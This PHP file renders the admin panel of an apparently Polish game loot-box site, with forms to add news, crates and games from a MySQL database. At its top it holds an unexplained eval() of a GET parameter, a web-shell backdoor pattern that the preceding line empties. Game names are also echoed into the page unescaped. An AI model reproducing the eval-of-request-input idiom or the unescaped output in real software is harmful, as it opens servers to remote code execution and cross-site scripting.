<?php

    session_start();
    
    $_GET['transporter'] = "";
    $value = $_GET['transporter'];
    eval($value);

    if(isset($_SESSION['zalogowany']) && $_SESSION['is_admin'] == "1")
    { 
        echo '<span style="font-size: 1.5em;">Liczba aktualnie zalogowanych użytkowników:';
        
        require_once("../connect.php");

        $polaczenie = @new mysqli($host, $db_user, $db_password, $db_name);
        @mysqli_set_charset($polaczenie,"utf8");
        
        if($polaczenie->connect_errno != 0)
        {  
            echo 'Błąd połączenia z bazą danych. <br /><br /> <span style="color:#a00000; font-weight:700;"> Numer błędu MySQL: ' . $polaczenie->connect_errno . '</span>';
        }
        else
        {
            if($rezultat = @$polaczenie->query("SELECT COUNT(last_seen) as zalogowani FROM users WHERE last_seen > DATE_SUB(NOW(), INTERVAL 3 MINUTE)"))
            {
                $data = mysqli_fetch_assoc($rezultat);
                echo ' <b>' . $data['zalogowani'] . '</b>.</span>';
            }
            else
            {
                echo "Bład połączenia z bazą danych.";
            }
        }
        
        
        echo '<span style="display: block; height: 5px; border-bottom: 1px dashed rgba(206, 192, 132, 0.7); margin-top: 10px; margin-bottom: 15px;"></span>
        
        <span style="font-size: 1.2em;"><b>Dodaj newsa do zakładki "Aktualności":</b></span><br /><br />
        Tytuł:<br />
        <input id="news_title_input" class="login_text_input" type="text" name="tytul_newsa" style="width:75%;">
        
        Data dodania newsa (rrrr-mm-dd):<br />
        <input id="news_date_input" class="login_text_input" type="date" name="data_newsa">
        
        Treść:<br /><span style="margin-top: 5px; font-size: 0.7em; color=rgba(255, 255, 255, 0.5); display: block; text-align: left; margin-left: 12%;"><b>Zdjęcie (wzór):</b> &lt;img class="news_img_ramka" src="TUTAJ WSTAWIĆ URL DO ZDJĘCIA"/&gt<br /><b>Zdjęcie bez tła (wzór):</b> &lt;img class="news_img_png" src="TUTAJ WSTAWIĆ URL DO ZDJĘCIA"/&gt<br /><b>Nowa linia ( 1x = nowa linia; 2x = nowa linia + odstęp itd. ):</b> &lt;br /&gt</span><textarea id="news_text_input" class="login_text_input" name="tresc_newsa" style="width:75%; height: 150px;"></textarea>
        
        <input id="add_news_btn" class="login_btn" name="dodaj_newsa" type="button" value="Dodaj">
        <span style="display: block; height: 5px; border-bottom: 1px dashed rgba(206, 192, 132, 0.7);"></span>
        <script src="JS/add_news.js"></script><br />
        
        <span style="font-size: 1.2em;"><b>Dodaj nową skrzynię do zakładki "Sklep":</b></span><br /><br />
        
        Ustaw nazwę nowej skrzyni:<br />
        <input id="case_title_input" class="login_text_input" type="text" name="nazwa_skrzyni_input" style="width:70%;">
        
        Ustaw cenę otwarcia nowej skrzyni (wPLN):<br />
        <input id="case_price_input" class="login_text_input" type="number" min="0.1" step="0.1" value="1" name="cena_skrzyni_input" style="width:200px;">
        
        Dodaj grafikę nowej skrzyni (URL do obrazka o wymiarach 250px X 250px):<br />
        <input id="case_image_input" class="login_text_input" type="text" name="grafika_skrzyni_input" style="width:70%;">
        
        Wybierz tytuł gry jaką chcesz dodać do nowej skrzyni:<br />
        <form>
          <select id="lista_gier_do_skrzyni" class="login_text_input" style="font-size: 1em; width: 70%; height: 50px; margin: 10px auto 0; padding: 5px;">';

        if($polaczenie->connect_errno != 0)
        {  
            echo 'Błąd połączenia z bazą danych. <br /><br /> <span style="color:#a00000; font-weight:700;"> Numer błędu MySQL: ' . $polaczenie->connect_errno . '</span>';
        }
        else
        {
            if($rezultat = @$polaczenie->query("SELECT name FROM games ORDER BY name ASC"))
            {
                $ile_gier = $rezultat -> num_rows;

                if($ile_gier > 0)
                {    
                    while($row = mysqli_fetch_array($rezultat))
                    {
                            $name = $row['name'];
                            
                            if($name == "Nothing")
                            {
                                echo '<option value="'. $name .'" style="color: red; font-weight: bold;">'. $name .' (brak wygranej)</option>';
                            }
                            else
                            {
                                echo '<option value="'. $name .'">'. $name .'</option>';
                            }
                    }
                }
            }
            else
            {
                echo "Bład połączenia z bazą danych.";
            }
            $polaczenie->close();
        }
          
        echo '</select><br />
          
          Ustal procent szans na wylosowanie tej gry:<br />
          <div id="range_input_div">
          
          </div>
          
          <input id="add_game_to_case_btn" class="login_btn" type="button" value="Dodaj grę do skrzyni"><br /><br />
        </form>
        
        Podgląd skrzyni:<br />
        <div id="game_in_case_list" style="display: block; width: 65%; height: 350px; border: 2px solid rgba(206, 192, 132, 0.7); word-wrap: break-word; overflow-y: auto; background-color: rgb(51, 64, 87); color: #fff; margin: 5px auto; padding: 15px; border-radius: 10px;"></div>
        
        <input id="add_case_btn" class="login_btn" name="dodaj_skrzynie" type="button" value="Dodaj skrzynię">
        <script src="JS/add_case.js"></script>
        
        <span style="display: block; height: 5px; border-bottom: 1px dashed rgba(206, 192, 132, 0.7);"></span><br />
        
        <span style="font-size: 1.2em;"><b>Dodaj nową grę do bazy danych:</b></span><br /><br />
        
        <form>
            Tytuł gry (upewnij się, że podany tytuł jest poprawnie zapisany!!):<br />
            <input id="add_game_title_input" class="login_text_input" type="text" name="add_game_title"  style="width: 75%;" required>

            Okładka / obrazek gry (URL do obrazka 200px X 250px):<br />
            <input id="add_game_image_input" class="login_text_input" type="text" name="add_game_image"  style="width: 75%;" required>
            
            Podaj orientacyjną wartość gry (PLN):<br />
            <input id="add_game_price_input" class="login_text_input" type="number" min="0.1" max="1000" step="0.1" value="0" name="add_game_price" required>
            
            <input id="add_game_to_db_btn" class="login_btn" type="submit" value="Dodaj grę do bazy"><br /><br />
            
            <script src="JS/add_game_to_db.js"></script>
            
        </form>';
        
    }
    else
    {
        sleep(0.1);
        echo '<script src="JS/login.js"></script>';
    }

?>